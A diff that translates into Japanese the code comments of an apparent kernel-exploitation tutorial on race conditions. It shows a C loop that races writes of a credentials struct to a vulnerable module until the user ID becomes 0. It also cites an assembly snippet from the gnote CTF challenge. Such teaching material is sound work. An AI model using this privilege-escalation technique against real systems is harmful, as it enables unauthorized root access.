@@ -44,12 +44,12 @@ strcpy(creds.password, "p4ssw0rd");
 次に、この構造体をモジュールに繰り返し書き込みます。確実に終了するよう、1,000,000 回(実質的には無限)ループさせます。
 
 ```c
-// don't want to make the loop infinite, just in case
+// 念のため、ループは無限にしない
 for (int i = 0; i < 1000000; i++) {
-    // now we write the cred struct to the module
+    // ここで cred 構造体をモジュールに書き込む
     res_id = write(fd, &creds, 0);
 
-    // if res_id is 0, stop the race
+    // res_id が 0 ならレースを止める
     if (!res_id) {
         puts("[+] ID is 0!");
         break;
@@ -90,7 +90,7 @@ FD: 3
 競合の窓がどれほど狭くても悪用できるのか、疑問に思うかもしれません。[TokyoWesterns CTF 2019 の `gnote`](https://rpis.ec/blog/tokyowesterns-2019-gnote/) では、競合の窓はアセンブリ命令 2 つぶんでした。
 
 ```
-; note that rbx is the buf argument, user-controlled
+; rbx は buf 引数で、ユーザーが制御できる点に注意
 cmp dword ptr [rbx], 5
 ja default_case
 mov eax, [rbx]
